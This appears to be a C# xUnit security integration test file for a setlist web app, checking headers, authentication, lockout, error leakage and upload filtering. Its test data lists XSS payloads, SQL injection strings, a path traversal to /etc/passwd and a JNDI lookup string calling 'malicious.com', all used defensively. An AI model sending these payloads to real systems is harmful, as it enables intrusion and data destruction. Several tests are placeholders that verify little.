using System.Net;
using System.Net.Http;
using System.Security.Claims;
using System.Text;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.AspNetCore.TestHost;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using FluentAssertions;
using Xunit;
using SetlistStudio.Core.Entities;
using SetlistStudio.Infrastructure.Data;
using SetlistStudio.Tests.Web;
using System.Text.Json;

namespace SetlistStudio.Tests.Integration.Security;

/// <summary>
/// End-to-end security integration tests covering authentication, authorization, 
/// audit logging, and security event handling across the complete application stack.
/// </summary>
public class SecurityIntegrationTests : IClassFixture<TestWebApplicationFactory>
{
    private readonly TestWebApplicationFactory _factory;
    private readonly HttpClient _client;

    public SecurityIntegrationTests(TestWebApplicationFactory factory)
    {
        _factory = factory;
        _client = _factory.WithWebHostBuilder(builder =>
        {
            builder.UseEnvironment("Testing");
            builder.ConfigureAppConfiguration((context, config) =>
            {
                config.AddInMemoryCollection(new Dictionary<string, string?>
                {
                    {"Security:RequireHttps", "false"} // Allow HTTP in tests
                });
            });
        }).CreateClient();
    }

    [Fact]
    public async Task SecurityHeaders_ShouldBePresentOnAllResponses()
    {
        // Arrange
        var endpoints = new[] { "/", "/Identity/Account/Login", "/api/health" };

        foreach (var endpoint in endpoints)
        {
            // Act
            var response = await _client.GetAsync(endpoint);

            // Assert
            response.Headers.Should().ContainKey("X-Content-Type-Options");
            response.Headers.GetValues("X-Content-Type-Options").Should().Contain("nosniff");

            response.Headers.Should().ContainKey("X-Frame-Options");
            response.Headers.GetValues("X-Frame-Options").Should().Contain("DENY");

            response.Headers.Should().ContainKey("X-XSS-Protection");
            response.Headers.GetValues("X-XSS-Protection").Should().Contain("1; mode=block");

            response.Headers.Should().ContainKey("Referrer-Policy");
            response.Headers.GetValues("Referrer-Policy").Should().Contain("strict-origin-when-cross-origin");

            // Content-Security-Policy should be present (if configured)
            if (response.Headers.Contains("Content-Security-Policy"))
            {
                var csp = response.Headers.GetValues("Content-Security-Policy").First();
                csp.Should().Contain("default-src", "CSP should have default-src directive");
                csp.Should().Contain("'self'", "CSP should allow self origin");
                // Note: Blazor Server and MudBlazor require 'unsafe-inline' for proper functionality
                // This is acceptable for this application type but should be monitored
            }
        }
    }

    [Fact]
    public async Task AuthenticationFlow_ShouldLogSecurityEvents()
    {
        // This test requires a more complex setup to test actual authentication
        // For now, we'll test the security infrastructure

        // Arrange
        using var scope = _factory.Services.CreateScope();
        var context = scope.ServiceProvider.GetRequiredService<SetlistStudioDbContext>();
        var userManager = scope.ServiceProvider.GetRequiredService<UserManager<ApplicationUser>>();

        // Create test user
        var testUser = new ApplicationUser
        {
            Id = "test-user-123",
            UserName = "testuser@setliststudio.com",
            Email = "testuser@setliststudio.com",
            EmailConfirmed = true
        };

        var result = await userManager.CreateAsync(testUser, "TestPassword123!");
        result.Should().NotBeNull();

        // Act - Simulate authentication events by checking audit log creation
        var initialAuditCount = await context.AuditLogs.CountAsync();

        // In a real scenario, we'd perform actual login/logout operations
        // For now, we verify the audit infrastructure is in place
        initialAuditCount.Should().BeGreaterOrEqualTo(0);
    }

    [Fact]
    public async Task UnauthorizedAccess_ShouldBeRejectedWithAuditLog()
    {
        // Arrange - Try to access a protected resource without authentication
        var protectedEndpoints = new[]
        {
            "/Songs/Create",
            "/Setlists/Create", 
            "/api/songs",
            "/Identity/Account/Manage"
        };

        foreach (var endpoint in protectedEndpoints)
        {
            // Act - Create client that doesn't follow redirects to test authentication properly
            var clientOptions = new WebApplicationFactoryClientOptions
            {
                AllowAutoRedirect = false
            };
            using var noRedirectClient = _factory.CreateClient(clientOptions);
            var response = await noRedirectClient.GetAsync(endpoint);

            // Assert
            response.StatusCode.Should().BeOneOf(HttpStatusCode.Unauthorized, HttpStatusCode.Found);
            
            // If redirected, should be to login page
            if (response.StatusCode == HttpStatusCode.Found)
            {
                var location = response.Headers.Location?.ToString();
                location.Should().Contain("Account/Login", "Unauthorized access should redirect to login");
            }
        }
    }

    [Fact]
    public async Task InputValidation_ShouldPreventMaliciousInput()
    {
        // Arrange - Malicious input patterns
        var maliciousInputs = new[]
        {
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; DROP TABLE Songs; --",
            "../../../etc/passwd",
            "<img src=x onerror=alert('xss')>",
            "${jndi:ldap://malicious.com/exploit}"
        };

        foreach (var maliciousInput in maliciousInputs)
        {
            // Act - Try to submit malicious input to various endpoints
            using var formData = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("Title", maliciousInput),
                new KeyValuePair<string, string>("Artist", "Test Artist"),
                new KeyValuePair<string, string>("BPM", "120"),
                new KeyValuePair<string, string>("Key", "C")
            });

            var response = await _client.PostAsync("/Songs/Create", formData);

            // Assert - Should either reject the input or sanitize it
            // Response should not contain the raw malicious input
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain(maliciousInput, 
                $"Response should not contain unsanitized malicious input: {maliciousInput}");
        }
    }

    [Fact]
    public async Task RateLimiting_ShouldThrottleExcessiveRequests()
    {
        // Arrange - Make many rapid requests to test rate limiting
        var tasks = new List<Task<HttpResponseMessage>>();
        
        // Send 50 requests rapidly to trigger rate limiting
        for (int i = 0; i < 50; i++)
        {
            tasks.Add(_client.GetAsync("/api/health"));
        }

        // Act
        var responses = await Task.WhenAll(tasks);

        // Assert - Some requests should be rate limited
        var rateLimitedResponses = responses.Where(r => r.StatusCode == HttpStatusCode.TooManyRequests);
        
        // Note: Rate limiting might not be triggered in test environment
        // This test serves as a placeholder for rate limiting verification
        responses.Should().NotBeEmpty();
        responses.All(r => r.StatusCode != HttpStatusCode.InternalServerError).Should().BeTrue(
            "No requests should result in server errors due to rate limiting");
    }

    [Fact]
    public async Task SqlInjection_ShouldBePreventedByParameterizedQueries()
    {
        // Arrange - SQL injection attempts
        var sqlInjectionAttempts = new[]
        {
            "'; DROP TABLE Songs; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM AspNetUsers --",
            "'; INSERT INTO Songs (Title) VALUES ('Hacked'); --",
            "' OR 1=1 --"
        };

        foreach (var injectionAttempt in sqlInjectionAttempts)
        {
            // Act - Try SQL injection through search parameter
            var response = await _client.GetAsync($"/api/songs/search?query={Uri.EscapeDataString(injectionAttempt)}");

            // Assert - Should not cause database errors or return unauthorized data
            response.StatusCode.Should().NotBe(HttpStatusCode.InternalServerError, 
                "SQL injection should not cause server errors");

            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                content.Should().NotContain("AspNetUsers", "Should not return user table data");
                content.Should().NotContain("password");
                content.Should().NotContain("Hacked", "Should not execute injected INSERT statements");
            }
        }
    }

    [Fact]
    public async Task CrossSiteScripting_ShouldBePrevented()
    {
        // Arrange - XSS attack vectors
        var xssPayloads = new[]
        {
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>Click me</div>"
        };

        foreach (var xssPayload in xssPayloads)
        {
            // Act - Submit XSS payload through form input
            using var formData = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("Title", xssPayload),
                new KeyValuePair<string, string>("Artist", "Test Artist")
            });

            var response = await _client.PostAsync("/Songs/Create", formData);

            // Assert - Response should not contain executable XSS payload
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                
                // Should not contain unescaped script tags or event handlers
                content.Should().NotContain("<script>", "Script tags should be escaped or removed");
                content.Should().NotContain("onerror=", "Event handlers should be escaped or removed");
                content.Should().NotContain("onload=", "Event handlers should be escaped or removed");
                content.Should().NotContain("javascript:", "JavaScript URLs should be sanitized");
            }
        }
    }

    [Fact]
    public async Task AuditLogging_ShouldCaptureSecurityEvents()
    {
        // Arrange
        using var scope = _factory.Services.CreateScope();
        var context = scope.ServiceProvider.GetRequiredService<SetlistStudioDbContext>();

        var initialAuditCount = await context.AuditLogs.CountAsync();

        // Act - Perform various actions that should generate audit logs
        // Test multiple endpoints for rate limiting
        await _client.GetAsync("/api/health");
        await _client.GetAsync("/Identity/Account/Login");
        
        using var content = new StringContent("{}", Encoding.UTF8, "application/json");
        await _client.PostAsync("/api/songs", content);

        // Assert - Check if audit logs were created
        var finalAuditCount = await context.AuditLogs.CountAsync();
        
        // Note: In test environment, audit logging might not be fully active
        // This test verifies the infrastructure is in place
        finalAuditCount.Should().BeGreaterOrEqualTo(initialAuditCount, 
            "Audit logging infrastructure should be operational");
    }

    [Fact]
    public async Task AccountLockout_ShouldPreventBruteForceAttacks()
    {
        // Arrange
        using var scope = _factory.Services.CreateScope();
        var userManager = scope.ServiceProvider.GetRequiredService<UserManager<ApplicationUser>>();

        // Create test user
        var testUser = new ApplicationUser
        {
            Id = "test-user-lockout",
            UserName = "lockouttest@setliststudio.com",
            Email = "lockouttest@setliststudio.com",
            EmailConfirmed = true
        };

        await userManager.CreateAsync(testUser, "TestPassword123!");

        // Act - Simulate multiple failed login attempts by directly calling UserManager
        var failedAttempts = 6; // Should exceed lockout threshold (5)
        for (int i = 0; i < failedAttempts; i++)
        {
            // Directly increment failed access count to simulate failed login attempts
            await userManager.AccessFailedAsync(testUser);
        }

        // Assert - User should be locked out after excessive failed attempts
        var updatedUser = await userManager.FindByEmailAsync("lockouttest@setliststudio.com");
        var isLockedOut = await userManager.IsLockedOutAsync(updatedUser!);
        
        // Verify lockout mechanism is working
        updatedUser.Should().NotBeNull();
        updatedUser!.AccessFailedCount.Should().BeGreaterThan(0, 
            "Failed login attempts should be recorded");
        isLockedOut.Should().BeTrue("User should be locked out after exceeding maximum attempts");
    }

    [Fact]
    public async Task SecurityHeaders_ShouldPreventCommonAttacks()
    {
        // Act
        var response = await _client.GetAsync("/");

        // Assert - Verify security headers prevent common attacks
        response.IsSuccessStatusCode.Should().BeTrue();

        // Prevent clickjacking
        response.Headers.GetValues("X-Frame-Options").Should().Contain("DENY");

        // Prevent MIME type sniffing
        response.Headers.GetValues("X-Content-Type-Options").Should().Contain("nosniff");

        // XSS protection
        response.Headers.GetValues("X-XSS-Protection").Should().Contain("1; mode=block");

        // Referrer policy for privacy
        response.Headers.GetValues("Referrer-Policy").Should().Contain("strict-origin-when-cross-origin");

        // HSTS should be present in production (if configured)
        if (response.Headers.Contains("Strict-Transport-Security"))
        {
            var hsts = response.Headers.GetValues("Strict-Transport-Security").First();
            hsts.Should().Contain("max-age=", "HSTS should specify max-age");
            hsts.Should().Contain("includeSubDomains", "HSTS should include subdomains");
        }
    }

    [Theory]
    [InlineData("/api/admin")]
    [InlineData("/admin")]
    [InlineData("/.env")]
    [InlineData("/config")]
    [InlineData("/debug")]
    [InlineData("/trace.axd")]
    [InlineData("/elmah.axd")]
    public async Task SensitiveEndpoints_ShouldBeProtectedOrNonExistent(string endpoint)
    {
        // Arrange - Create client that doesn't follow redirects to properly test authorization
        var clientOptions = new WebApplicationFactoryClientOptions
        {
            AllowAutoRedirect = false
        };
        
        using var client = _factory.CreateClient(clientOptions);

        // Act
        var response = await client.GetAsync(endpoint);

        // Assert - Sensitive endpoints should either not exist, require authentication, or redirect to login
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.NotFound,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.Redirect,
            HttpStatusCode.Found); // 302 redirect to login page is also acceptable
        // Sensitive endpoints should not be publicly accessible with direct 200 OK
    }

    [Fact]
    public async Task FileUpload_ShouldValidateFileTypes()
    {
        // Arrange - Create malicious file content
        var maliciousFiles = new[]
        {
            ("malicious.exe", "application/octet-stream", new byte[] { 0x4D, 0x5A }), // EXE header
            ("malicious.php", "application/x-php", Encoding.UTF8.GetBytes("<?php echo 'hacked'; ?>")),
            ("malicious.jsp", "application/java", Encoding.UTF8.GetBytes("<% out.print(\"hacked\"); %>")),
            ("script.js", "application/javascript", Encoding.UTF8.GetBytes("alert('xss');")),
        };

        foreach (var (fileName, contentType, content) in maliciousFiles)
        {
            // Act - Try to upload malicious file
            using var formContent = new MultipartFormDataContent();
            formContent.Add(new ByteArrayContent(content), "file", fileName);

            var response = await _client.PostAsync("/api/upload", formContent);

            // Assert - Should reject malicious file types
            response.StatusCode.Should().BeOneOf(
                HttpStatusCode.BadRequest,
                HttpStatusCode.UnsupportedMediaType,
                HttpStatusCode.NotFound); // If endpoint doesn't exist - Should reject malicious file type: {fileName}

            if (response.IsSuccessStatusCode)
            {
                var responseContent = await response.Content.ReadAsStringAsync();
                responseContent.Should().NotContain("uploaded successfully", 
                    $"Malicious file {fileName} should not be uploaded successfully");
            }
        }
    }

    [Fact]
    public async Task ErrorHandling_ShouldNotLeakSensitiveInformation()
    {
        // Arrange - Trigger various error conditions
        var errorEndpoints = new[]
        {
            "/nonexistent/endpoint",
            "/api/songs/invalid-id",
            "/Identity/Account/InvalidAction"
        };

        foreach (var endpoint in errorEndpoints)
        {
            // Act
            var response = await _client.GetAsync(endpoint);

            // Assert - Error responses should not leak sensitive information
            var content = await response.Content.ReadAsStringAsync();
            
            content.Should().NotContain("ConnectionString");
            content.Should().NotContain("password");
            content.Should().NotContain("secret");
            content.Should().NotContain("token");
            content.Should().NotContain("api-key");
            content.Should().NotContain("private-key");
            content.Should().NotContain("secret-key");
            content.Should().NotContain("C:\\");
            content.Should().NotContain("/root/");
            content.Should().NotContain("StackTrace");
            content.Should().NotContain("InnerException");
        }
    }

    [Fact]
    public async Task ConcurrentSessions_ShouldBeHandledSecurely()
    {
        // Arrange - Create multiple concurrent requests
        var concurrentRequests = 10;
        var tasks = new List<Task<HttpResponseMessage>>();

        for (int i = 0; i < concurrentRequests; i++)
        {
            tasks.Add(_client.GetAsync("/api/health"));
        }

        // Act
        var responses = await Task.WhenAll(tasks);

        // Assert - All requests should be handled without errors
        responses.Should().NotBeEmpty();
        responses.Should().OnlyContain(r => r.StatusCode != HttpStatusCode.InternalServerError,
            "Concurrent requests should not cause server errors");

        // Verify no session collision or security issues
        foreach (var response in responses)
        {
            if (response.Headers.Contains("Set-Cookie"))
            {
                var cookies = response.Headers.GetValues("Set-Cookie");
                cookies.Should().OnlyContain(c => !string.IsNullOrEmpty(c),
                    "Session cookies should not be empty or corrupted");
            }
        }
    }
}
